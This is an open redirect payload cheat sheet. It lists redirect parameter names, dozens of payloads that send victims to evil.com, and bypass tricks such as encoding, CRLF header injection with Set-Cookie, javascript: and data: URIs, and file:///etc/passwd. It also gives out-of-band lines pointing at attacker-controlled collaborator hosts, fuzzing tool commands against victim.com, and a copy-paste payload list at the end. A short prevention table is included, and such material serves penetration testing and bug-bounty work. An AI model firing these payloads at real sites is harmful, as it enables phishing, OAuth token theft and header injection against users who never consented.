# OPEN REDIRECT PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS OPEN REDIRECT?

**Open Redirect** (also known as Unvalidated Redirect and Forward) occurs when an application accepts a user-controlled parameter that specifies a URL to redirect to, without proper validation. An attacker can craft a link that appears to belong to the trusted site but redirects the victim to a malicious site.

**Impact:**
- **Phishing:** Users trust the original domain and may enter credentials on the attacker's site.
- **SSRF chaining:** Can be used to bypass allowlists and reach internal services.
- **OAuth token theft:** Redirect URIs can leak authorization codes.
- **Malware distribution:** Redirect to a drive-by download.

**Key fact:** It is in the **OWASP Top 10** (A01:2021 – Broken Access Control, often classified under it) and is a common finding in bug bounty programs.

---

## 2. TYPES OF OPEN REDIRECT

| Type | Description |
|------|-------------|
| **Header-based** | The server sets a `Location` header based on user input. |
| **Meta Refresh** | HTML `<meta http-equiv="refresh" content="0;url=...">` |
| **JavaScript-based** | `window.location = userInput;` |
| **Form-based** | A form action points to a user-controlled URL. |
| **Path-based** | The path itself is used as the redirect target. |

---

## 3. COMMON PARAMETER NAMES

Attackers should test any parameter that looks like it controls navigation:

```
url
next
redirect
redirect_uri
redirect_url
return
returnUrl
return_to
continue
dest
destination
target
r
u
link
goto
out
view
forward
to
callback
```

---

## 4. BASIC DETECTION PAYLOADS

Use a simple external domain to test if the application redirects to it.

### 4.1 Simple External URL
```
?url=https://evil.com
?next=https://evil.com
?redirect=https://evil.com
?return=https://evil.com
?returnUrl=https://evil.com
?continue=https://evil.com
?dest=https://evil.com
?target=https://evil.com
?r=https://evil.com
?u=https://evil.com
?link=https://evil.com
?goto=https://evil.com
?out=https://evil.com
?view=https://evil.com
?forward=https://evil.com
?to=https://evil.com
?callback=https://evil.com
```

### 4.2 Protocol-relative URL
```
?url=//evil.com
?next=//evil.com
?redirect=//evil.com
```

### 4.3 Backslash and Mixed
```
?url=/\evil.com
?url=\/evil.com
?url=\\evil.com
?url=//evil.com\
```

### 4.4 Using `@` to confuse parsers
```
?url=https://trusted.com@evil.com
?url=https://trusted.com.evil.com
?url=https://evil.com#trusted.com
?url=https://evil.com?trusted.com
?url=https://evil.com/trusted.com
```

### 4.5 Using `#` (Fragment)
```
?url=https://trusted.com#@evil.com
?url=https://evil.com#trusted.com
```

### 4.6 Using `?` to break the URL
```
?url=https://evil.com?trusted.com
```

### 4.7 Using `%00` (Null byte)
```
?url=https://evil.com%00.trusted.com
?url=https://evil.com%00
```

### 4.8 Using `%0d%0a` (CRLF)
```
?url=https://evil.com%0d%0aLocation: https://trusted.com
```

### 4.9 Using Unicode / Homoglyphs
```
?url=https://evil.com
?url=https://ｅｖｉｌ.com
?url=https://evil.com
```

---

## 5. BYPASS TECHNIQUES

### 5.1 URL Encoding
```
?url=https%3A%2F%2Fevil.com
?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### 5.2 Double URL Encoding
```
?url=https%253A%252F%252Fevil.com
?url=%2568%2574%2574%2570%2573%253A%252F%252F%2565%2576%2569%256C%252E%2563%256F%256D
```

### 5.3 Mixed Case in Scheme
```
?url=HtTpS://evil.com
?url=hTtPs://evil.com
?url=HTTP://evil.com
```

### 5.4 Using Whitespace and Control Characters
```
?url=%09https://evil.com
?url=%0ahttps://evil.com
?url=%0dhttps://evil.com
?url=https://evil.com%20
```

### 5.5 Using Backslashes (Windows-style)
```
?url=https:\\evil.com
?url=\\evil.com
?url=\/evil.com
```

### 5.6 Using `@` with Encoded Characters
```
?url=https://trusted.com%40evil.com
?url=https://evil.com%40trusted.com
```

### 5.7 Using `//` and `/\`
```
?url=//evil.com
?url=/\evil.com
?url=\/evil.com
```

### 5.8 Using `?` and `#` After the Domain
```
?url=https://evil.com?trusted.com
?url=https://evil.com#trusted.com
```

### 5.9 Bypass Allowlist with Subdomain
If the application only allows redirects to `trusted.com`, try:
```
?url=https://trusted.com.evil.com
?url=https://evil.com.trusted.com
?url=https://trusted.com@evil.com
?url=https://evil.com#trusted.com
?url=https://evil.com?trusted.com
?url=https://trusted.com/redirect?url=https://evil.com
```

### 5.10 Bypass with Open Redirect on Trusted Domain
If `trusted.com` has its own open redirect, chain it:
```
?url=https://trusted.com/redirect?url=https://evil.com
```

### 5.11 Using Data URI
```
?url=data:text/html,<script>alert(1)</script>
?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 5.12 Using JavaScript URI
```
?url=javascript:alert(1)
?url=javascript:window.location='https://evil.com'
```

### 5.13 Using `vbscript:` (old IE)
```
?url=vbscript:msgbox(1)
```

### 5.14 Using `file://`
```
?url=file:///etc/passwd
?url=file:///C:/Windows/win.ini
```

### 5.15 Using `ftp://`
```
?url=ftp://evil.com
```

---

## 6. CONTEXT-SPECIFIC PAYLOADS

### 6.1 Header-based (Location)
If the parameter is directly used in a `Location` header, use these:
```
?url=https://evil.com
?url=//evil.com
?url=/\evil.com
?url=https://evil.com%0d%0aSet-Cookie: session=evil
```

### 6.2 Meta Refresh
If the parameter is reflected in a meta refresh tag:
```
?url=https://evil.com
?url=//evil.com
?url=javascript:alert(1)
```

### 6.3 JavaScript Redirect
If the parameter is used in `window.location` or `location.href`:
```
?url=https://evil.com
?url=//evil.com
?url=javascript:alert(1)
?url=data:text/html,<script>alert(1)</script>
```

### 6.4 Form Action
If the parameter is used as a form action:
```
?url=https://evil.com
?url=//evil.com
```

### 6.5 Path-based
If the path itself is the redirect target:
```
/redirect/https://evil.com
/redirect//evil.com
/redirect/../evil.com
```

---

## 7. BLIND / OOB DETECTION

If you cannot see the redirect directly, use an external listener.

```
?url=http://attacker.burpcollaborator.net
?url=http://attacker.interactsh.com
?url=http://<YOUR-SERVER>/redirect
```

Check for DNS or HTTP requests hitting your server.

---

## 8. TOOLS

| Tool | Usage |
|------|-------|
| **Burp Suite** | Manual testing with Repeater and Intruder. |
| **OpenRedireX** | Automated open redirect scanner. |
| **Oralyzer** | Open redirect fuzzer. |
| **GF (grep patterns)** | `gf redirect` to find parameters. |
| **PayloadsAllTheThings** | Repository of open redirect payloads. |
| **HackTricks** | Complete guide. |

**Commands:**
```bash
# Using gf to find redirect parameters
cat urls.txt | gf redirect

# Using OpenRedireX
python3 openredirex.py -u "https://victim.com/?url=FUZZ" -p payloads.txt

# Using Oralyzer
python3 oralyzer.py -u "https://victim.com/?url=FUZZ"
```

---

## 9. DEFENSE / PREVENTION

| Rule | Explanation |
|------|-------------|
| **1. Avoid user-controlled redirects** | Use server-side mapping of IDs to URLs. |
| **2. Allowlist of domains** | Only redirect to a predefined list of trusted domains. |
| **3. Relative paths only** | If redirecting internally, use relative paths like `/home`. |
| **4. Validate the URL** | Parse the URL and check the host against an allowlist. |
| **5. Use a warning page** | Show a warning before redirecting to an external site. |
| **6. Sign the redirect URL** | Use HMAC to ensure the URL has not been tampered with. |
| **7. Disallow dangerous schemes** | Block `javascript:`, `data:`, `vbscript:`, `file:`. |
| **8. Enforce HTTPS** | Prevent protocol-relative URLs from downgrading. |
| **9. Use `rel="nofollow"`** | Not a fix, but reduces SEO impact. |
| **10. WAF and RASP** | Use rules to detect common bypass patterns. |

---

## 10. TIPS FOR TESTING

1. Identify all parameters that look like redirects (url, next, redirect, return, etc.).
2. Start with a simple external domain: `?url=https://evil.com`.
3. If blocked, try protocol-relative: `?url=//evil.com`.
4. Try bypasses: `@`, `#`, `?`, backslashes, URL encoding.
5. Check if the application validates only the beginning of the string (`https://trusted.com.evil.com`).
6. Test if the redirect happens after login, logout, or other actions.
7. Use Burp Collaborator or Interactsh for blind detection.
8. Test both GET and POST parameters.
9. Check for JavaScript-based redirects in the response.
10. Always test on your own account first.

---

## 11. QUICK REFERENCE – BYPASS CHEAT SHEET

| Technique | Example |
|-----------|---------|
| Protocol-relative | `//evil.com` |
| Backslash | `/\evil.com`, `\/evil.com`, `\\evil.com` |
| At symbol | `https://trusted.com@evil.com` |
| Subdomain | `https://trusted.com.evil.com` |
| Fragment | `https://evil.com#trusted.com` |
| Query | `https://evil.com?trusted.com` |
| URL encoding | `%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d` |
| Double encoding | `%2568%2574%2574%2570%2573%253A%252F%252F%2565%2576%2569%256C%252E%2563%256F%256D` |
| Case variation | `HtTpS://evil.com` |
| Null byte | `https://evil.com%00.trusted.com` |
| CRLF | `https://evil.com%0d%0aLocation: https://trusted.com` |
| Data URI | `data:text/html,<script>alert(1)</script>` |
| JavaScript URI | `javascript:alert(1)` |
| File URI | `file:///etc/passwd` |

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
?url=https://evil.com
?next=https://evil.com
?redirect=https://evil.com
?return=https://evil.com
?returnUrl=https://evil.com
?continue=https://evil.com
?dest=https://evil.com
?target=https://evil.com
?r=https://evil.com
?u=https://evil.com
?link=https://evil.com
?goto=https://evil.com
?out=https://evil.com
?view=https://evil.com
?forward=https://evil.com
?to=https://evil.com
?callback=https://evil.com
?url=//evil.com
?next=//evil.com
?redirect=//evil.com
?url=/\evil.com
?url=\/evil.com
?url=\\evil.com
?url=//evil.com\
?url=https://trusted.com@evil.com
?url=https://trusted.com.evil.com
?url=https://evil.com#trusted.com
?url=https://evil.com?trusted.com
?url=https://evil.com/trusted.com
?url=https://trusted.com#@evil.com
?url=https://evil.com#trusted.com
?url=https://evil.com?trusted.com
?url=https://evil.com%00.trusted.com
?url=https://evil.com%00
?url=https://evil.com%0d%0aLocation: https://trusted.com
?url=https://evil.com
?url=https://ｅｖｉｌ.com
?url=https%3A%2F%2Fevil.com
?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
?url=https%253A%252F%252Fevil.com
?url=%2568%2574%2574%2570%2573%253A%252F%252F%2565%2576%2569%256C%252E%2563%256F%256D
?url=HtTpS://evil.com
?url=hTtPs://evil.com
?url=HTTP://evil.com
?url=%09https://evil.com
?url=%0ahttps://evil.com
?url=%0dhttps://evil.com
?url=https://evil.com%20
?url=https:\\evil.com
?url=\\evil.com
?url=\/evil.com
?url=https://trusted.com%40evil.com
?url=https://evil.com%40trusted.com
?url=//evil.com
?url=/\evil.com
?url=\/evil.com
?url=https://evil.com?trusted.com
?url=https://evil.com#trusted.com
?url=https://trusted.com.evil.com
?url=https://evil.com.trusted.com
?url=https://trusted.com@evil.com
?url=https://evil.com#trusted.com
?url=https://evil.com?trusted.com
?url=https://trusted.com/redirect?url=https://evil.com
?url=data:text/html,<script>alert(1)</script>
?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
?url=javascript:alert(1)
?url=javascript:window.location='https://evil.com'
?url=vbscript:msgbox(1)
?url=file:///etc/passwd
?url=file:///C:/Windows/win.ini
?url=ftp://evil.com
?url=https://evil.com%0d%0aSet-Cookie: session=evil
/redirect/https://evil.com
/redirect//evil.com
/redirect/../evil.com
?url=http://attacker.burpcollaborator.net
?url=http://attacker.interactsh.com
?url=http://<YOUR-SERVER>/redirect
cat urls.txt | gf redirect
python3 openredirex.py -u "https://victim.com/?url=FUZZ" -p payloads.txt
python3 oralyzer.py -u "https://victim.com/?url=FUZZ"
```
